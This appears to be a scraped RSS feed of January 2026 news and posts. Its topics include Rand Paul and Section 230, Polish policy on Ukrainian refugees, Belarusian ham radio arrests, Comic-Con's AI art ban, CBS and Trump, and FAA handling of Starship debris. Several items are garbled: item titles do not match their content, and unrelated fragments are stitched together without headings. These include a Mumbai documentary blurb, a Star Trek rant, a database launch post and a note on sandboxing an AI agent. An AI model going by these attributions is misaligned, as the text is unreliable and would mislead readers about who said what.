allegations that the pandemic originated in a Wuhan lab, and my assertion that cloth masks don’t prevent transmission.Yes. And you screamed bloody murder about it. You insisted they should  do that. You built your entire position around the idea that platforms shouldn’t be deciding what’s true. And, with the re-election of Donald Trump, the big tech platforms all bent the knee and said they’d stop being arbiters of truth (even as it was legal for them to do so).And so they stopped. And now you’re furious that they won’t make an exception for you.Doesn’t that seem just a bit fucking hypocritical and entitled?The “It’s Their Property” ProblemPaul’s real complaint—buried under all the high-minded rhetoric about defamation—is that Google makes its own decisions:So, Google and YouTube not only choose to moderate speech they don’t like, but they also will remove speeches from the Senate floor despite such speeches being specifically protected by the Constitution.Google’s defense of speech appears to be limited to defense of speech they agree with.Yeah, dude. That’s how private property works. They get to decide what they host and what they don’t. That’s how it works. It’s also protected by  First Amendment rights. Compelled hosting or not hosting of speech you agree or disagree with is not a remedy available to you, Senator.Part of the liability protection granted internet platforms, section 230(c)(2), specifically allows companies the take down “harassing” content. This gives the companies wide leeway to take down defamatory content. Thus far, the companies have chosen to spend considerable time and money to take down content they politically disagree with yet leave content that is quite obviously defamatory. So Google does not have a blanket policy of refraining to evaluate truth. Google chooses to evaluate what it believes to be true when it is convenient and consistent with its own particular biases.He says this as if it’s controversial. It’s not. It’s exactly how editorial discretion works. The company gets to make their own editorial decisions. You don’t have to like those decisions. But demanding they make different ones, and threatening to strip their legal protections if they don’t, is a government official using state power to coerce speech decisions.You know, the thing Paul claimed to be against.I think Google is, or should be, liable for hosting this defamatory video that accuses me of treason, at least from the point in time when Google was made aware of the defamation and danger.Again: you already threatened the creator, and they took it down. The remedy worked. You used it successfully.And if Paul’s standard is “Google becomes liable once made aware,” then anyone who wants content removed will just  it’s defamatory and dangerous. How is this different from the COVID videos Paul was so mad they removed? People told Google those were false and dangerous, Google removed them, and Paul was furious that they acted after being “made aware” of allegedly false and dangerous content.Now Google is doing exactly what Paul demanded—not removing content based on mere claims of falsity or danger—and he’s  mad at them.So what’s Paul’s solution? Threaten to remove Section 230:It is particularly galling that, even when informed of the death threats stemming from the unsubstantiated and defamatory allegations, Google refused to evaluate the truth of what it was hosting despite its widespread practice of evaluating and removing other content for perceived lack of truthfulness.Remember when MAGA world insisted that Biden administration officials threatening platforms’ Section 230 protections was unconstitutional coercion? Remember how that was supposedly the worst violation of the First Amendment imaginable?Rand Paul is now doing the same thing. A sitting Senator, using his platform and his legislative power, threatening to strip legal protections from a company because they won’t remove content he personally dislikes.Paul literally told these platforms it wasn’t their job to determine truth or falsity. He literally sponsored a bill to prevent government officials from pressuring platforms about content. And now he’s doing exactly what he said was wrong—and threatening consequences if they don’t comply.He didn’t “change his mind” on Section 230. He just revealed that he never had a principled position in the first place.Paul supported Section 230 when he thought it meant platforms would leave up content he liked. He sponsored anti-jawboning legislation when he thought it would stop people he disagreed with from pressuring platforms. But the moment the system produces an outcome he doesn’t like—even though it worked exactly as designed and the video came down anyway—he’s ready to burn the whole thing down.What is it with Senators and their thin skins? A few months ago we wrote about Senator Amy Klobuchar pressing for an obviously unconstitutional law against deepfakes after someone made an obviously fake satirical video about her. Now Paul joins the club: Senators who want to remake internet law because someone was mean to them online.The video’s already down, Senator. You won. Maybe take the win instead of trying to burn down the open internet because Google wouldn’t do you a personal favor (the same favor you wanted to make illegal).]]></content:encoded></item><item><title>Davos showdown: How Trump triggered the worst transatlantic crisis in generations</title><link>https://www.channel4.com/news/davos-showdown-how-trump-triggered-the-worst-transatlantic-crisis-in-generations</link><author>Anushka Asthana</author><category>news</category><pubDate>Wed, 21 Jan 2026 17:23:19 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[Was Greenland ever just a punchline?

Is there some truth to this suspicion?For the most recent one, I purposefully chose not to dive into the advanced literature heavy stuff even though I did do the work. The scope of the task was pretty vague ("design an ML system blah blah") and as soon as I started my presentation, one of my interviewers immediately questioned me about whether I had read the literature and wasn't interested in older approaches to the same problem.

Queer subculture, everyday slum life and spiritual celebrity culture - Mumbai nightlife could hardly be more diverse. Anything is possible, here!

Mumbai: India's financial, commercial and entertainment center. This is the New York of South Asia, according to many of its inhabitants. Here, they say, anything is possible and hard work pays off. Like New York City, Mumbai is a melting pot of different cultures and lifestyles - and a city that never sleeps. Between red carpets and slums, this documentary shows a city full of contrasts.

Reporter Johannes Hano explores the night with a motorcycle gang. He experiences Bollywood glamour, celebrates an Indian wedding and immerses himself in the harsh life of the slums. He rides through the chaotic night-time streets in a three-wheeler with queer Muslim drag artist Zeesh, and talks to him on a red carpet. Zeesh speaks openly about his initially difficult relationship with his mother after coming out, diversity in India and his path to the cover of Indian Vogue. Rochelle Pinto from Vogue India describes the fashion industry’s take on what Zeesh embodies in his nightly stage shows: the shift towards more diversity and a different set of attitudes.
  
But change is also a question of self-empowerment. Take Amruta Mane, for example: at the age of 21, she founded a motorcycle driving school for women called Women on Wheels. In doing so, she's creating spaces for independence - in a society where self-determination is often not a given.

Radhe Maa has a somewhat different community. Her followers say she's a deity (godwoman) and she's as revered as she is controversial. She's omnipresent in Mumbai: posters bearing her image look down on the city streets.

But not all faces are so visible, especially at night when most people are asleep. In Dharavi, one of the largest slums in the world, reporter Johannes Hano meets a baker. And in Dhobi Ghat, the largest open-air laundry in the world, he visits a laundry worker at home - and looks on, as he goes about his tough job.
 
Mumbai - encounters with people whose courage, creativity and diversity are inspiring.

As of this writing, the new show Star Trek: Starfleet Academy has come out and it's release is totally unrelated to this release. The timing is pure coincidence I assure you. Mark and Gork love Star Trek and probably will continue to talk about. However, after seeing Starfleet Academy (or SA as Kurtzman calls it) it is so bad and misguided it's almost a moot point. Star Trek as it once was... is lost. I think it's too far gone. It is possible to make a new series (with new producers) and set it in the 24th century in an isolated setting and have smaller, well written stories that don't involve revenge, a super-weapon, or people that sound like total idiots and are annoying, but knowing that the future of Starfleet will eventually look like it does is a specter that cannot be ignored. What has happened? HOW did this happen? Who has dirt on who? Is NuTrek a scam? A tax write-off? Is 80% of the budget going to the 24 credited producers? I mean, how does a show with so few viewers even become profitable for a streaming service. Or even an asset and not a liability? Morg smells something fishy going on... maybe? At least according to his opinion. Rork and Glorg in no way suggest any illegal activity, but just perhaps activity that might not be moral at the very least. I mean, seriously?

So we decided to build it: https://github.com/s2-streamstore/s2s2-lite is MIT-licensed, written in Rust, and uses SlateDB (https://slatedb.io) as its storage engine. SlateDB is an embedded LSM-style key-value database on top of object storage, which made it a great match for delivering the same durability guarantees as s2.dev.You can specify a bucket and path to run against an object store like AWS S3 — or skip to run entirely in-memory. (This also makes it a great emulator for dev/test environments).Why not just open up the backend of our cloud service? s2.dev has a decoupled architecture with multiple components running in Kubernetes, including our own K8S operator – we made tradeoffs that optimize for operation of a thoroughly multi-tenant cloud infra SaaS. With s2-lite, our goal was to ship something dead simple to operate. There is a lot of shared code between the two that now lives in the OSS repo.A few features remain (notably deletion of resources and records), but s2-lite is substantially ready. Try the Quickstart in the README to stream Star Wars using the s2 CLI!The key difference between S2 vs a Kafka or Redis Streams: supporting tons of durable streams. I have blogged about the landscape in the context of agent sessions (https://s2.dev/blog/agent-sessions#landscape). Kafka and NATS Jetstream treat streams as provisioned resources, and the protocols/implementations are oriented around such assumptions. Redis Streams and NATS allow for larger numbers of streams, but without proper durability.The cloud service is completely elastic, but you can also get pretty far with lite despite it being a single-node binary that needs to be scaled vertically. Streams in lite are "just keys" in SlateDB, and cloud object storage is bottomless – although of course there is metadata overhead.One thing I am excited to improve in s2-lite is pipelining of writes for performance (already supported behind a knob, but needs upstream interface changes for safety). It's a technique we use extensively in s2.dev. Essentially when you are dealing with high latencies like S3, you want to keep data flowing throughout the pipe between client and storage, rather than go lock-step where you first wait for an acknowledgment and then issue another write. This is why S2 has a session protocol over HTTP/2, in addition to stateless REST.You can test throughput/latency for lite yourself using the `s2 bench` CLI command. The main factors are: your network quality to the storage bucket region, the latency characteristics of the remote store, SlateDB's flush interval (`SL8_FLUSH_INTERVAL=..ms`), and whether pipelining is enabled (`S2LITE_PIPELINE=true` to taste the future).I'll be here to get thoughts and feedback, and answer any questions!]]></content:encoded></item><item><title>How Britain Made the L1A1 SLR: Archive Film with intro by firearms expert Jonathan Ferguson</title><link>https://www.youtube.com/watch?v=-NxwHBgS5AE</link><author>Royal Armouries</author><category>yt</category><enclosure url="https://www.youtube.com/v/-NxwHBgS5AE?version=3" length="" type=""/><pubDate>Wed, 21 Jan 2026 16:06:43 +0000</pubDate><source url="https://www.youtube.com/channel/UCsMX-XuiEkBi4-GDrYuniWg">Royal Armouries</source><content:encoded><![CDATA[Following last week’s look at the very first L1A1 SLR ever produced (1957), we’re sharing a remarkable Royal Small Arms Factory (RSAF) Enfield archive film, shot in the 1960s, showing the key stages of L1A1 manufacture and a rare glimpse of the original Enfield pattern room.

We cannot do what we do without your support.Poland’s government has approved a bill that would end the special support provided to Ukrainian refugees, which was put in place after millions began to arrive in 2022 following Russia’s full-scale invasion. Almost one million Ukrainian refugees remain in Poland today.“In March 2022, Poland put in place special measures to support Ukrainian refugees, who were at the time entering Poland in huge numbers. Since then, the legislation has been repeatedly extended.However, last year it was the subject of a political dispute between the government and newly elected President Karol Nawrocki, who is aligned with the right-wing opposition.In August, Nawrocki vetoed a government bill extending support on existing terms, arguing that it unjustly “privileged” Ukrainians over other groups. In the end, he and the government reached a compromise that extended support until March 2026 but made access to certain benefits contingent upon employment.The president also made clear that it was the last time he would approve an extension of special support for Ukrainians. “We need to switch to normal conditions, i.e. treating Ukrainian citizens in Poland in the same way as all other foreigners,” said his chief of staff, Zbigniew Bogucki.The new measures, which were agreed by the government on Tuesday but must still be approved by parliament and the president, would go into force in March 2026. They would end some forms of special support for Ukrainians immediately, while phasing out others by March 2027.Instead, the legislation would introduce “One element of the bill would see “a gradual transition of healthcare to principles similar to those applicable to Polish citizens ([through] contributions and insurance)”, says the interior ministry.Ukrainian refugees without healthcare insurance would be treated the same as uninsured Polish citizens. There would be exceptions for children, pregnant women, victims of violence, and wounded soldiers.Additionally, special measures put in place to help Ukrainian children adapt to Polish schools – such as Polish language classes, preparatory courses and simplified rules for hiring intercultural assistants – will be removed at the end of the current academic year.Meanwhile, the provision of accommodation and food would be restricted to particularly vulnerable groups, such as the elderly or people with disabilities.The current right of Ukrainians to establish a business under special rules – i.e. the same conditions applicable to Polish citizens – will also be terminated, notes the  daily.Some human rights groups have warned that the proposed new measures go too far, and could leave some vulnerable groups without protection and even at risk of homelessness.The Helsinki Foundation for Human Rights (HFPC) argues that an element of the bill giving those wishing to obtain support a 14-day deadline to apply for a Polish identity number contravenes EU law. They also note that, for some Ukrainians, obtaining the necessary documentation may be hard due to the war in their homeland.The office of Poland’s Commissioner for Human Rights has raised similar objections, reports .Meanwhile, the Lewiatan Confederation, a business lobby representing large employers, criticised the fact that the planned measures will limit the possibility of hiring Ukrainians under a simplified procedure.They warn that this could “paralyse the labour” market, noting that Ukrainians constitute around 66% of the million or so foreign workers in Poland.Lewiatan also criticised the fact that temporary protection would be removed from foreigners who leave Poland for more than 30 days, noting that the bill does not make any exception for employees posted abroad by Polish companies.The bill could still be amended while it undergoes work in parliament, where the government has a majority. Once approved by parliament, Nawrocki would have the choice of signing it into law, vetoing it, or sending it to the constitutional court for review.While the initial mass arrival of Ukrainian refugees in Poland in 2022 prompted a mass outpouring of support from Poles, many of whom hosted refugees in their own homes, sentiment has recently been turning against them.A poll published this month by state research agency CBOS showed that the proportion of Poles opposed to accepting Ukrainian refugees has risen to 46%, the highest level ever recorded.In September, a United Surveys poll for Wirtualna Polska found that 37% of Poles negatively view the presence of Ukrainians in Poland, up from 29.5% two years earlier.

I'd love some feedback, both on the threat model and the tool itself.

I was juggling agents working on epics for the linear solver, the persistence layer, the front-end, and planning for the second-generation solver. I was losing my mind playing whack-a-mole with the permission prompts. YOLO mode felt so tempting. And yet.Then it occurred to me: what if YOLO mode isn't so bad? Decision fatigue is a thing. If I could cap the blast radius of a confused agent, maybe I could just review once. Wouldn't that be safer?So that day, while my kids were taking a nap, I decided to see if I could put YOLO-mode Claude inside a sandbox that blocks exfiltration and regulates git access. The result is yolo-cage.Also: the AI wrote its own containment system from inside the system's own prototype.

The arrests are an extreme attack on what is most often a wholesome hobby that has a history of being vilified by authoritarian governments in part because the technology is quite censorship resistant.The detentions were announced last week on Belarusian state TV, which claimed the men were part of a network of more than 50 people participating in the amateur radio hobby and have been accused of both “espionage” and “treason.” Authorities there said they seized more than 500 pieces of radio equipment. The men were accused on state TV of using radio to spy on the movement of government planes, though no actual evidence of this has been produced.State TV claimed they were associated with the Belarusian Federation of Radioamateurs and Radiosportsmen (BFRR), a long-running amateur radio club and nonprofit that holds amateur radio competitions, meetups, trainings, and forums. WhatsApp and email requests to the BFRR from 404 Media were not returned. , Siarhei Besarab, a Belarusian amateur radio operator, posted a plea for support from others in the hobby: “MAYDAY from Belarus: Licensed operators facing death penalty.”“I am writing this because my local community is being systematically liquidated in what I can only describe as a targeted intellectual genocide,” Besarab wrote. “They have detained over 50 licensed people, including callsigns EW1ABT, EW1AEH, and EW1ACE. These men were paraded on state television like war criminals and were coerced to publicly repent for the "crime" of technical curiosity. Propagandists presented the Belarusian Federation of Radioamateurs and Radiosportsmen (BFRR) as a front for a ‘massive spy network.’”“State propaganda unironically claims these men were ‘pumping state secrets out of the air’ using nothing more than basic $25 Baofeng handhelds and consumer-grade SDR dongles,” he added. “Any operator knows that hardware like this is physically incapable of cracking the modern AES-256 digital encryption used by government security forces. It is a technical fraud, yet they are being charged with High Treason and Espionage. The punishment in Belarus for these charges is life in prison or the death penalty.”The Belarusian human rights group Viasna and its associated Telegram channel confirmed the detention and said that it spoke to a cellmate of Andrei Repetsi, who said that Repetsi was unable to talk about his case in jail: “The case is secret, so Andrei never told the essence of the case in the cell. He joked that his personal file was marked ‘Top secret. Burn before reading,’” Viasna wrote. Most hams operate amateur radios for fun, as part of competitions, or to keep in touch with other hams around the world. But the hobby has a long history of being attacked by governments in part because it is resistant to censorship. Amateur radio often works even if a natural disaster or political action takes down internet, cell, and phone services, so it is popular among people interested in search and rescue and doomsday prepping. Amateur radio has been used to share information out of Cuba, for example, and in 2021 the Cuban government jammed ham radio frequencies during anti-government protests there. ]]></content:encoded></item><item><title>Inside the $300 million project to save the Great Barrier Reef #shorts</title><link>https://www.youtube.com/shorts/MzcCkLGBKaE</link><author>Vox</author><category>yt</category><enclosure url="https://www.youtube.com/v/MzcCkLGBKaE?version=3" length="" type=""/><pubDate>Wed, 21 Jan 2026 14:06:52 +0000</pubDate><source url="https://www.youtube.com/channel/UCLXo7UDZvByw2ixzpQCufnA">Vox</source><content:encoded><![CDATA[It’s no secret that the Great Barrier Reef needs help.

It was a small victory for working artists in an industry where jobs are slipping away as movie and video game studios adopt generative AI tools to save time and money. Every year, tens of thousands of people descend on San Diego for Comic-Con, the world’s premier comic book convention that over the years has also become a major pan-media event where every major media company announces new movies, TV shows, and video games. For the past few years, Comic-Con has allowed some forms of AI-generated art at this art show at the convention. According to  for the show, artists could display AI-generated material so long as it wasn’t for sale, was marked as AI-produced, and credited the original artist whose style was used.“Material produced by Artificial Intelligence (AI) may be placed in the show, but only as Not-for-Sale (NFS). It must be clearly marked as AI-produced, not simply listed as a print. If one of the parameters in its creation was something similar to ‘Done in the style of,’ that information must be added to the description. If there are questions, the Art Show Coordinator will be the sole judge of acceptability,” Comic-Con’s art show rules said until recently.These rules have been in place since at least 2024, but anti-AI sentiment is growing in the artistic community and an artist-led backlash against Comic-Con’s AI-friendly language led to the convention quietly changing the rules. Twenty-four hours after artists called foul the AI-friendly policy, Comic-Con updated the language on its site. “Material created by Artificial Intelligence (AI) either partially or wholly, is not allowed in the art show,” it now says. AI is now banned at the art show.Comic and concept artist Tiana Oreglia told 404 Media Comic-Con’s friendly attitude towards AI was a slippery slope towards normalization. “I think we should be standing firm especially with institutions like Comic-Con which are quite literally built off the backs of artists and the creative community,” she said. Oreglia was one of the first artists to notice the AI-friendly policy. In addition to alerting her circle of friends, she also wrote a letter to Comic-Con itself.Artist Karla Ortiz told 404 Media she learned about the AI-friendly policy after some fellow artists shared it with her. Ortiz is a major artist who has worked with some of the major studios who exhibit work at Comic-Con. She’s also got a large following on social media, a following she used to call out Comic-Con’s organizers.“Comic-con deciding to allow GenAi imagery in the art show—giving valuable space to GenAi users to show slop right NEXT to actual artists who worked their asses off to be there—is a disgrace!” Ortiz said in a . “A tone deaf decision that rewards and normalizes exploitative GenAi against artists in their own spaces!”According to Ortiz, the convention is a sacred place she didn’t want to see desecrated by AI. “Comic-Con is the big mecca for comic artists, illustrators, and writers,” she said. “I organize and speak with a lot of different artists on the generative AI issue. It’s something that impacts us and impacts our lives. A lot of us have decided: ‘No, we’re not going to sit by the sidelines.’”Oritz explained that generative AI was already impacting the livelihood of working artists. She said that, in the past, artists could sustain themselves on long projects for companies that included storyboarding and design. “Suddenly the duration of projects are cut,” she said. “They got generative AI to generate a bunch of references, a bunch of boards. ‘We already did the initial ideation, so just paint this. Paint what generative AI has generated for us.’”Ortiz pointed to two high profile examples: Marvel using AI to make the title sequence for  and Coca-Cola using AI to make . “You have this encroaching exploitative technology impacting almost every single level of the entertainment industry, whether you’re a writer, or a voice actor, or a musician, a painter, a concept artist, an illustrator. It doesn’t matter…and then to have Comic-Con, that place that’s supposed to be a gathering and a celebration of said creatives and their work, suddenly put on a pedestal the exploitative technology that only functions because of its training on our works? It’s upsetting beyond belief.”“What is Comic-Con trying to tell the industry?” She said, “It’s telling artists: ‘Hey you, you’re exploitable and you’re replaceable.’”Ortiz was heartened that Comic-Con changed its policy. “It was such a relief,” she said. “Generative AI is still going to creep its nasty way in some way or another, but at least it’s not something we have to take lying down. It’s something we can actively speak out against.”Comic-Con did not respond to 404 Media’s request for comment, but Oreglia said she did hear back from art show organizer Glen Wooten. “He basically told me that they put those AI stipulations in when AI was just starting to come around and that the inability to sell AI-generated works was meant to curtail people from submitting genAI works,” she said. “He seems to be very against genAI but wasn't really able to change the current policy until artists voiced their opinions loudly which pressured the office into banning AI completely.”Despite changing policies and broad anti-AI sentiment among the artistic community, Oreglia has still seen an uptick of AI art at conventions. “Although there are many cons that ban it outright and if you get caught selling it you basically will get banned.” This happened to a vendor at Dragon Con last September. Organizers called police to  off the premises. “And I was tabling at Fanexpo SF and definitely saw genAI in the dealers hall, none in the artists alley as far as I could see though but I mostly stuck to my table,” she said. “I was also at Emerald City Comic Con last year and they also have a no-ai policy but fanexpo doesn't seem to have those same policies as far as I know.”AI image generators are trained on original artwork so whatever output a tool like Midjourney creates is based on an artist’s work, often without compensation or credit. Oreglia also said she feels that AI is an artistic dead end. “Everything interesting, uplifting, and empowering I find about art gets stripped away and turned into vapid facsimiles based on vibes and trendy aesthetics,” she said.]]></content:encoded></item><item><title>Trump Continues To Make It Clear He Has CBS On A Leash</title><link>https://www.techdirt.com/2026/01/21/trump-continues-to-make-it-clear-he-has-cbs-on-a-leash/</link><author>Karl Bode</author><category>tech</category><pubDate>Wed, 21 Jan 2026 13:28:08 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[And even though CBS executives paid Trump a bribe to get their merger approved, and keep demonstrating they’re a loyal lapdog (like airing this extremely dubious story claiming that the ICE murderer of Renee Good suffered internal bleeding from being lightly bumped, which many CBS News employees doubted), the Trump administration feels compelled to remind CBS that they’re little more than an administration lap dog now.“He said, ‘Make sure you guys don’t cut the tape. Make sure the interview is out in full,’” Leavitt told new “CBS Evening News” anchor Tony Dokoupil, relaying a message from the president ahead of the interview earlier this week. “He said, ‘If it’s not out in full, we’ll sue your ass off.’”Dokoupil responded with levity: “He always says that!”CBS’ reward for its initial feckless appeasement to the Trump administration was utterly bogus lawsuits, baseless FCC “investigations,” and getting relentlessly attacked in the right wing media as some sort of leftist rag (when again, CBS, if anything, had spent much of the last decade pandering to the U.S. right). Weiss then threw what was left of CBS’ reputation in the trash by turning it into a Trump apologist rag that grovels before Trump at every possibility, yet you’ll notice that’s  somehow not deferential enough for our mad, idiot king. There’s a lesson here for anybody who strikes a partnership with this unpopular, extremist administration: there’s simply no bottom once you sell out your principles. And someday, when Trump is dead and gone, the stain will still be there and many people will remember how unprincipled and pathetic you were . CBS will find it can never be extremist, conspiratorial, racist, or deferential enough to truly appeal to the MAGA base, who already have ample choices for their propaganda. And the rest of the public will simply avoid the network on principle, well aware it threw all ethics in the toilet when it really mattered. And when the “new CBS” collapses in an unwatched heap, its fate will have been truly earned.]]></content:encoded></item><item><title>SW Design, Architecture &amp; Clarity at Scale • Sam Newman, Jacqui Read &amp; Simon Rohrer • GOTO 2025</title><link>https://www.youtube.com/watch?v=t67oWHa00iE</link><author>GOTO Conferences</author><category>yt</category><enclosure url="https://www.youtube.com/v/t67oWHa00iE?version=3" length="" type=""/><pubDate>Wed, 21 Jan 2026 13:01:45 +0000</pubDate><source url="https://www.youtube.com/channel/UCs_tLP3AiwYKwdUHpltJPuA">GOTO Conferences</source><content:encoded><![CDATA[This conversation was recorded at GOTO Copenhagen 2025. #GOTOcon #GOTOcph

How does someone become a colourist? What do they really do? What is a CDL? DI? QC? DIT? P3? HDR? James, with whom we've worked with several times, graciously explains what all these acronyms (and more) mean, how a colourist generally goes about their work nowadays on any given project, and what he's able to do to help filmmakers solve problems and help realize their visions in the final stages of post-production. James has experience timing dailies and also applying the finishing grade, and he helps us explain the different responsibilities and expectations of each process. James later helps us provide an overview of the different types of deliverables for a film, and he shares some common mistakes young colorists today should avoid.

We cannot do what we do without your support.A Russian married couple accused of being spies have gone on trial in Poland. The pair, who had refugee status, are alleged to have passed information to Moscow about Russian opposition figures in Poland. The husband is additionally accused of sending a package containing explosives.The couple, who can be named only as Igor R. and Irina R. under Polish privacy law, were pictured arriving at court in the city of Sosnowiec on Tuesday. However, the trial has been closed to the public at the request of prosecutors to protect information relating to national security.As he was escorted to the hearing by police officers, Igor R. (pictured above) was seen holding a sign containing the words (in Polish) “Russia” and “Putin” and (in Russian) “fuck war”.The capitalised “N” in Putin was turned on its side to look like a “Z” (the symbol of Russia’s war in Ukraine) with a line crossing it out, while the letter “O”  had been turned into a peace symbol.The couple had previously been students at the University of Silesia and both had refugee status in Poland, reports broadcaster TVN. Igor had been an active member of Russian opposition groups while still in Russia.But, according to prosecutors, between February and August 2022, Igor R. cooperated with Russia’s Federal Security Service (FSB), including by collecting intelligence on Russian opposition figures. Irina R. then sought to pass the information on to the FSB on an electronic storage device.Igor R. is additionally accused of working as part of a group – also containing another Russian and two Ukrainian citizens – to send a parcel containing a nitroglycerin-based explosive and military-grade electronic detonators.The group sought to have the package transported by a courier company, and it was discovered in a warehouse in Poland belonging to the delivery firm.The couple, who were detained in July 2024 and indicted in October 2025, are both charged with espionage. However, because their alleged offences occurred before the relevant law was toughened to increase penalties to up to life in prison, they would face up to 15 years if convicted.Igor R. is additionally charged with causing a large-scale threat to the lives or health of other people or to property, which is punishable by up to eight years in prison.Igor R.’s defence lawyer, Marta Smołka, told the Polish Press Agency (PAP) that they were opposed to the trial being held behind closed doors given that “there’s so much [information] circulating in the public sphere” already. She argues that open proceedings offer a great guarantee of fairness and transparency.Poland has in recent years detained, charged and in some cases convicted dozens of agents accused of carrying out espionage, sabotage and other so-called “hybrid actions” on behalf of Russia.Last week, Polish prosecutors indicted five people – four Ukrainian citizens and one Russian – accused of carrying out a plot on behalf of Russia to plant explosives in packages that were then dispatched by courier services across Europe.

The company planned as many as five such launches a year as it perfected the craft, a version of which is supposed to one day land on the moon.The FAA, which also oversees commercial space launches, predicted the impact to the national airspace would be “minor or minimal,” akin to a weather event, the agency’s 2022 approval shows. No airport would need to close and no airplane would be denied access for “an extended period of time.” But the reality has been far different. Last year, three of Starship’s five launches exploded at unexpected points on their flight paths, twice raining flaming debris over congested commercial airways and disrupting flights. And while no aircraft collided with rocket parts, pilots were forced to scramble for safety. A ProPublica investigation, based on agency documents, interviews with pilots and passengers, air traffic control recordings and photos and videos of the events, found that by authorizing SpaceX to test its experimental rocket over busy airspace, the FAA accepted the inherent risk that the rocket might put airplane passengers in danger. And once the rocket failed spectacularly and that risk became real, neither the FAA nor Secretary of Transportation Sean Duffy sought to revoke or suspend Starship’s license to launch, a move that is permitted when “necessary to protect the public health and safety.” Instead, the FAA allowed SpaceX to test even more prototypes over the same airspace, adding stress to the already-taxed air traffic control system each time it launched.The first two Starship explosions last year forced the FAA to make real-time calls on where to clear airspace and for how long. Such emergency closures camewith little or no warning, ProPublica found, forcing pilots to suddenly upend their flight plans and change course in heavily trafficked airspace to get out of the way of falling debris. In one case, a plane with 283 people aboard ran low on fuel, prompting its pilot to declare an emergency and cross a designated debris zone to reach an airport.The world’s largest pilots union told the FAA in October that such events call into question whether “a suitable process” is in place to respond to unexpected rocket mishaps. “There is high potential for debris striking an aircraft resulting in devastating loss of the aircraft, flight crew, and passengers,” wrote Steve Jangelis, a pilot and aviation safety chair.The FAA said in response to questions that it “limits the number of aircraft exposed to the hazards, making the likelihood of a catastrophic event extremely improbable.” Yet for the public and the press, gauging that danger has been difficult. In fact, nearly a year after last January’s explosion, it remains unclear just how close Starship’s wreckage came to airplanes. SpaceX estimated where debris fell after each incident and reported that information to the federal government. But the company didn’t respond to ProPublica’s requests for that data, and the federal agencies that have seen it, including the FAA, haven’t released it. The agency told us that it was unaware of any other publicly available data on Starship debris.In public remarks, Musk downplayed the risk posed by Starship. To caption a video of flaming debris in January, he wrote, “Entertainment is guaranteed!” and, after the March explosion, he posted, “Rockets are hard.” The company has been more measured, saying it learns from mistakes, which “help us improve Starship’s reliability.” For airplanes traveling at high speeds, there is little margin for error. Research shows as little as 300 grams of debris — or two-thirds of a pound — “could catastrophically destroy an aircraft,” said Aaron Boley, a professor at the University of British Columbia who has studied the danger space objects pose to airplanes. Photographs of Starship pieces that washed up on beaches show items much bigger than that, including large, intact tanks.“It doesn’t actually take that much material to cause a major problem to an aircraft,” Boley said.In response to growing alarm over the rocket’s repeated failures, the FAA has expanded prelaunch airspace closures and offered pilots more warning of potential trouble spots. The agency said it also required SpaceX to conduct investigations into the incidents and to “implement numerous corrective actions to enhance public safety.” An FAA spokesperson referred ProPublica’s questions about what those corrective actions were to SpaceX, which did not respond to multiple requests for comment.Experts say the FAA’s shifting approach telegraphs a disquieting truth about air safety as private companies increasingly push to use the skies as their laboratories: Regulators are learning as they go. During last year’s Starship launches, the FAA was under pressure to fulfill a dual mandate: to regulate and promote the commercial space industry while keeping the flying public safe, ProPublica found. In his October letter, Jangelis called the arrangement “a direct conflict of interest.” In an interview, Kelvin Coleman, who was head of FAA’s commercial space office during the launches, said his office determined that the risk from the mishaps “was within the acceptable limits of our regulations.” But, he said, “as more launches are starting to take place, I think we have to take a real hard look at the tools that we have in place and how do we better integrate space launch into the airspace.”“We Need to Protect the Airspace” On Jan. 16, 2025, as SpaceX prepared to launch Starship 7 from Boca Chica, Texas, the government had to address the possibility the giant rocket would break up unexpectedly. Using debris modeling and simulations, the U.S. Space Force, the branch of the military that deals with the nation’s space interests, helped the FAA draw the contours of theoretical “debris response areas” — no-fly zones that could be activated if Starship exploded.With those plans in place, Starship Flight 7 lifted off at 5:37 p.m. EST. About seven minutes later, it achieved a notable feat: Its reusable booster rocket separated, flipped and returned to Earth, where giant mechanical arms caught it as SpaceX employees cheered.But about 90 seconds later, as Starship’s upper stage continued to climb, SpaceX lost contact with it. The craft caught fire and exploded, far above Earth’s surface. A pilot on a flight from Miami to Santo Domingo, Dominican Republic, recorded video of space debris visible from the cockpit while flying at 37,000 feet. Provided to ProPublicaAir traffic control’s communications came alive with surprised pilots who saw the accident, some of whom took photos and shot videos of the flaming streaks in the sky: I just got a major streak going for at least 60 miles, all these different colors. Just curious but — it looked like it was coming towards us, but obviously because of the distance …. Just letting you know.Can you, can you give an estimate on how far away it is?Another controller warned a different pilot of debris in the area:Due to a space vehicle mishap —  a rocket launch that basically exploded between our airspace and Miami — I’m going to give you holding instructions because there was debris in the area, so I’m going to keep you away from it.Two FAA safety inspectors were in Boca Chica to watch the launch at SpaceX’s mission control, said Coleman, who, for Flight 7, was on his laptop in Washington, D.C., receiving updates.As wreckage descended rapidly toward airplanes’ flight paths over the Caribbean, the FAA activated a no-fly zone based on the vehicle’s last known position and prelaunch calculations. Air traffic controllers warned pilots to avoid the area, which stretched hundreds of miles over a ribbon of ocean roughly from the Bahamas to just east of St. Martin, covering portions of populated islands, including all of Turks and Caicos. While the U.S. controls some airspace in the region, it relies on other countries to cooperate when it recommends a closure. The FAA also cordoned off a triangular zone south of Key West.When a pilot asked when planes would be able to proceed through the area, a controller replied: The only information I got is that the rocket exploded so we need to protect the airspace, and Miami and Domingo stopped taking aircraft.There were at least 11 planes in the closed airspace when Starship exploded, and flight tracking data shows they hurried to move out of the way, clearing the area within 15 minutes. Such maneuvers aren’t without risk. “If many aircraft need to suddenly change their routing plans,” Boley said, “then it could cause additional stress” on an already taxed air traffic control system, “which can lead to errors.”That wasn’t the end of the disruption though. The FAA kept the debris response area, or DRA, active for another 71 minutes, leaving some flights in a holding pattern over the Caribbean. Several began running low on fuel and some informed air traffic controllers that they needed to land.“We haven’t got enough fuel to wait,” said one pilot for Iberia airlines who was en route from Madrid with 283 people on board.The controller warned him that if he proceeded across the closed airspace, it would be at his own risk: If you’re going to pass through the DRA, you guys’re going to need to declare an emergency. That’s what my supervisor — if you’re going to land at San Juan, you need to declare an emergency for fuel reasons, that’s what my supervisor just told me. In that case, we declare emergency. Mayday mayday mayday.The plane landed safely in San Juan, Puerto Rico.Iberia did not respond to requests for comment, but in statements to ProPublica, other airlines downplayed the launch fallout. Delta, for example, said the incident “had minimal impact to our operation and no aircraft damage.” The company’s “safety management system and our safety culture help us address potential issues to reinforce that air transportation remains the safest form of travel in the world,” a spokesperson said.After the incident, some pilots registered concerns 